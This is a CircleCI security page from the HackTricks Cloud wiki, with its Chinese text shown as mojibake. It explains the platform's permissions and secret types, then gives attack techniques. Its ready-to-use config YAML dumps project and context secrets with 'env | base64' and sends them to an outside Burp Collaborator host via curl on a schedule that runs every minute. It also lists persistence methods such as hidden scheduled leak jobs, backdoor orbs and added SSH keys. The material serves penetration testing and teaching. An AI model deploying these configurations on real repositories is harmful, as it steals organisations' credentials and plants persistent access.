# CircleCIå®‰å…¨

<details>

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§**ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)æ˜¯ä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥**å®šä¹‰æ¨¡æ¿**ï¼ŒæŒ‡ç¤ºæ‚¨å¸Œæœ›å®ƒå¯¹æŸäº›ä»£ç æ‰§è¡Œä½•ç§æ“ä½œä»¥åŠä½•æ—¶æ‰§è¡Œã€‚è¿™æ ·ï¼Œæ‚¨å¯ä»¥ç›´æ¥ä»æ‚¨çš„å­˜å‚¨åº“ä¸»åˆ†æ”¯**è‡ªåŠ¨åŒ–æµ‹è¯•**æˆ–**éƒ¨ç½²**ã€‚

## æƒé™

**CircleCI** **ç»§æ‰¿äº†**ä¸ç™»å½•ç›¸å…³çš„**github**å’Œ**bitbucket**çš„**æƒé™**ã€‚\
åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œæˆ‘å‘ç°åªè¦æ‚¨åœ¨**github**ä¸Šå¯¹å­˜å‚¨åº“å…·æœ‰**å†™å…¥æƒé™**ï¼Œæ‚¨å°±å¯ä»¥åœ¨**CircleCI**ä¸­**ç®¡ç†å…¶é¡¹ç›®è®¾ç½®**ï¼ˆè®¾ç½®æ–°çš„sshå¯†é’¥ï¼Œè·å–é¡¹ç›®apiå¯†é’¥ï¼Œåˆ›å»ºå…·æœ‰æ–°CircleCIé…ç½®çš„æ–°åˆ†æ”¯...ï¼‰ã€‚

ä½†æ˜¯ï¼Œæ‚¨éœ€è¦æ˜¯**å­˜å‚¨åº“ç®¡ç†å‘˜**æ‰èƒ½**å°†å­˜å‚¨åº“è½¬æ¢ä¸ºCircleCIé¡¹ç›®**ã€‚

## ç¯å¢ƒå˜é‡å’Œç§˜å¯†

æ ¹æ®[**æ–‡æ¡£**](https://circleci.com/docs/2.0/env-vars/)ï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥åœ¨å·¥ä½œæµç¨‹ä¸­**åŠ è½½ç¯å¢ƒå˜é‡çš„å€¼**ã€‚

### å†…ç½®ç¯å¢ƒå˜é‡

ç”±CircleCIè¿è¡Œçš„æ¯ä¸ªå®¹å™¨å°†å§‹ç»ˆå…·æœ‰[**æ–‡æ¡£ä¸­å®šä¹‰çš„ç‰¹å®šç¯å¢ƒå˜é‡**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)ï¼Œå¦‚`CIRCLE_PR_USERNAME`ï¼Œ`CIRCLE_PROJECT_REPONAME`æˆ–`CIRCLE_USERNAME`ã€‚

### æ˜æ–‡

æ‚¨å¯ä»¥åœ¨**å‘½ä»¤**ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
æ‚¨å¯ä»¥åœ¨**è¿è¡Œç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å½¢å¼å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨**build-jobç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å½¢å¼å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨**å®¹å™¨ç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å½¢å¼å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### é¡¹ç›®æœºå¯†

è¿™äº›æ˜¯åªèƒ½è¢«é¡¹ç›®ï¼ˆä»»ä½•åˆ†æ”¯ï¼‰è®¿é—®çš„**æœºå¯†**ã€‚\
æ‚¨å¯ä»¥åœ¨ _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ ä¸­æŸ¥çœ‹å®ƒä»¬çš„å£°æ˜ã€‚

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**"åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®å¯¼å…¥å˜é‡åˆ°æ­¤é¡¹ç›®ã€‚
{% endhint %}

### ä¸Šä¸‹æ–‡æœºå¯†

è¿™äº›æ˜¯**ç»„ç»‡èŒƒå›´**çš„æœºå¯†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•å­˜å‚¨åœ¨æ­¤å¤„çš„æœºå¯†éƒ½å¯ä»¥è¢«**ä»»ä½•å­˜å‚¨åº“**è®¿é—®ï¼š

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
ä½†è¯·æ³¨æ„ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªä¸åŒçš„ç»„ï¼ˆè€Œä¸æ˜¯æ‰€æœ‰æˆå‘˜ï¼‰æ¥**ä»…å…è®¸ç‰¹å®šäººå‘˜è®¿é—®æœºå¯†**ã€‚\
è¿™ç›®å‰æ˜¯å¢åŠ æœºå¯†å®‰å…¨æ€§çš„æœ€ä½³æ–¹å¼ä¹‹ä¸€ï¼Œä¸å…è®¸æ¯ä¸ªäººéƒ½è®¿é—®å®ƒä»¬ï¼Œè€Œåªå…è®¸æŸäº›äººè®¿é—®ã€‚
{% endhint %}

## æ”»å‡»

### æœç´¢æ˜æ–‡æœºå¯†

å¦‚æœæ‚¨å¯ä»¥è®¿é—®VCSï¼ˆå¦‚githubï¼‰ï¼Œè¯·æ£€æŸ¥æ¯ä¸ªå­˜å‚¨åº“çš„æ¯ä¸ªåˆ†æ”¯çš„`.circleci/config.yml`æ–‡ä»¶ï¼Œå¹¶æœç´¢å…¶ä¸­å­˜å‚¨çš„æ½œåœ¨**æ˜æ–‡æœºå¯†**ã€‚

### æœºå¯†ç¯å¢ƒå˜é‡å’Œä¸Šä¸‹æ–‡æšä¸¾

é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ¯ä¸ª`.circleci/config.yml`æ–‡ä»¶ä¸­ä½¿ç”¨çš„**æ‰€æœ‰æœºå¯†åç§°**ã€‚æ‚¨è¿˜å¯ä»¥ä»è¿™äº›æ–‡ä»¶ä¸­è·å–ä¸Šä¸‹æ–‡åç§°ï¼Œæˆ–åœ¨Webæ§åˆ¶å°ä¸­æ£€æŸ¥å®ƒä»¬ï¼š_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ã€‚

### å¤–æ³„é¡¹ç›®æœºå¯†

{% hint style="warning" %}
ä¸ºäº†**å¤–æ³„**æ‰€æœ‰é¡¹ç›®å’Œä¸Šä¸‹æ–‡**æœºå¯†**ï¼Œæ‚¨åªéœ€è¦å¯¹æ•´ä¸ªgithubç»„ç»‡ä¸­çš„**1ä¸ªå­˜å‚¨åº“**å…·æœ‰**å†™å…¥**è®¿é—®æƒé™ï¼ˆ_å¹¶ä¸”æ‚¨çš„å¸æˆ·å¿…é¡»å¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªäººéƒ½å¯ä»¥è®¿é—®æ¯ä¸ªä¸Šä¸‹æ–‡_ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**"åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®å¯¼å…¥å˜é‡åˆ°æ­¤é¡¹ç›®ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥**ä»æ‰€æœ‰å­˜å‚¨åº“å¯¼å…¥æ‰€æœ‰é¡¹ç›®å˜é‡**ï¼Œç„¶å**ä¸€èµ·å¤–æ³„æ‰€æœ‰è¿™äº›å˜é‡**ã€‚
{% endhint %}

æ‰€æœ‰é¡¹ç›®æœºå¯†å§‹ç»ˆè®¾ç½®åœ¨ä½œä¸šçš„ç¯å¢ƒä¸­ï¼Œå› æ­¤åªéœ€è°ƒç”¨ç¯å¢ƒå¹¶å°†å…¶æ··æ·†ä¸ºbase64ï¼Œå³å¯åœ¨**å·¥ä½œæµWebæ—¥å¿—æ§åˆ¶å°**ä¸­å¤–æ³„æœºå¯†ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®Webæ§åˆ¶å°**ï¼Œä½†å¯ä»¥**è®¿é—®å­˜å‚¨åº“**ï¼Œå¹¶ä¸”çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ªå·¥ä½œæµ**ï¼Œ**æ¯åˆ†é’Ÿè§¦å‘ä¸€æ¬¡**ï¼Œå°†**æœºå¯†ä¿¡æ¯ä¼ é€åˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### æ³„éœ²ä¸Šä¸‹æ–‡ä¸­çš„ç§˜å¯†

æ‚¨éœ€è¦**æŒ‡å®šä¸Šä¸‹æ–‡åç§°**ï¼ˆè¿™ä¹Ÿå°†æ³„éœ²é¡¹ç›®çš„ç§˜å¯†ï¼‰ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®Webæ§åˆ¶å°**ï¼Œä½†å¯ä»¥**è®¿é—®å­˜å‚¨åº“**ï¼Œå¹¶ä¸”çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹ä¸€ä¸ªæ¯åˆ†é’Ÿè§¦å‘**å¹¶**å°†æœºå¯†ä¿¡æ¯ä¼ è¾“åˆ°å¤–éƒ¨åœ°å€**çš„å·¥ä½œæµç¨‹ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
ä»…åœ¨å­˜å‚¨åº“ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ `.circleci/config.yml` **å¹¶ä¸è¶³ä»¥è§¦å‘ CircleCI æ„å»º**ã€‚æ‚¨éœ€è¦åœ¨ CircleCI æ§åˆ¶å°ä¸­**å°†å…¶å¯ç”¨ä¸ºä¸€ä¸ªé¡¹ç›®**ã€‚
{% endhint %}

### é€ƒé€¸è‡³äº‘ç«¯

**CircleCI** æä¾›äº†åœ¨**ä»–ä»¬çš„æœºå™¨ä¸Šæˆ–åœ¨æ‚¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œæ„å»ºçš„é€‰é¡¹**ã€‚\
é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æœºå™¨ä½äº GCPï¼Œæœ€åˆæ‚¨å¯èƒ½æ‰¾ä¸åˆ°ä»»ä½•ç›¸å…³ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœå—å®³è€…åœ¨**ä»–ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä»»åŠ¡ï¼ˆå¯èƒ½æ˜¯åœ¨äº‘ç¯å¢ƒä¸­ï¼‰**ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°ä¸€ä¸ª**åŒ…å«æœ‰è¶£ä¿¡æ¯çš„äº‘å…ƒæ•°æ®ç«¯ç‚¹**ã€‚

è¯·æ³¨æ„ï¼Œåœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰å†…å®¹éƒ½æ˜¯åœ¨ä¸€ä¸ª Docker å®¹å™¨ä¸­å¯åŠ¨çš„ï¼Œä½†æ‚¨ä¹Ÿå¯ä»¥**è¯·æ±‚å¯åŠ¨ä¸€ä¸ª VM æœºå™¨**ï¼ˆå¯èƒ½å…·æœ‰ä¸åŒçš„äº‘æƒé™ï¼‰:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
ç”šè‡³æ˜¯å…·æœ‰è®¿é—®è¿œç¨‹ Docker æœåŠ¡æƒé™çš„ Docker å®¹å™¨ï¼š
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### æŒä¹…æ€§

* å¯ä»¥åœ¨CircleCIä¸­**åˆ›å»ºç”¨æˆ·ä»¤ç‰Œ**ä»¥ä½¿ç”¨ç”¨æˆ·æƒé™è®¿é—®APIç«¯ç‚¹ã€‚
* _https://app.circleci.com/settings/user/tokens_
* å¯ä»¥**åˆ›å»ºé¡¹ç›®ä»¤ç‰Œ**ä»¥ä½¿ç”¨åˆ†é…ç»™ä»¤ç‰Œçš„æƒé™è®¿é—®é¡¹ç›®ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* å¯ä»¥å‘é¡¹ç›®**æ·»åŠ SSHå¯†é’¥**ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* å¯ä»¥åœ¨æ„å¤–é¡¹ç›®ä¸­çš„éšè—åˆ†æ”¯ä¸­**åˆ›å»ºå®šæ—¶ä»»åŠ¡**ï¼Œæ¯å¤©**æ³„éœ²**æ‰€æœ‰**ä¸Šä¸‹æ–‡ç¯å¢ƒ**å˜é‡ã€‚
* æˆ–è€…ç”šè‡³åœ¨åˆ†æ”¯ä¸­åˆ›å»º/ä¿®æ”¹å·²çŸ¥ä»»åŠ¡ï¼Œæ¯å¤©**æ³„éœ²**æ‰€æœ‰ä¸Šä¸‹æ–‡å’Œ**é¡¹ç›®æœºå¯†**ã€‚
* å¦‚æœæ‚¨æ˜¯GitHubæ‰€æœ‰è€…ï¼Œå¯ä»¥**å…è®¸æœªç»éªŒè¯çš„orbs**å¹¶åœ¨ä½œä¸šä¸­é…ç½®ä¸€ä¸ªä½œä¸º**åé—¨**ã€‚
* æ‚¨å¯ä»¥åœ¨æŸäº›ä»»åŠ¡ä¸­æ‰¾åˆ°**å‘½ä»¤æ³¨å…¥æ¼æ´**ï¼Œé€šè¿‡**ç§˜å¯†**ä¿®æ”¹å…¶å€¼**æ³¨å…¥å‘½ä»¤**

<details>

{% hint style="success" %}
å­¦ä¹ å¹¶å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
